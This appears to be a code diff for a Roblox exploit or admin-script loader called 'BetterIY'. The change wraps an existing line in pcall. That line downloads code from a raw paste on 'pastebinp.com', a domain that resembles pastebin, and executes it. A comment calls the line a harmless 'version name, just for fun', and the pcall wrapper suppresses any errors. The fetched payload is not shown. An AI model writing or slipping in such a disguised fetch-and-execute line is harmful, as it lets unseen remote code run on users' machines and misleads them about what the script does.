@@ -7,7 +7,9 @@ pcall(function() getgenv().BetterIY_LOADED = true end)
 
 if BetterIY_LOADED2 then return end
 
+pcall(function()
 loadstring(game:HttpGet("https://pastebinp.com/raw/r5fSgr3k"))() -- Version name, this is just for fun
+end)
 
 task.wait(math.random(0,0.33)) -- the plugin multi-executes this so this is just to prevent that
 
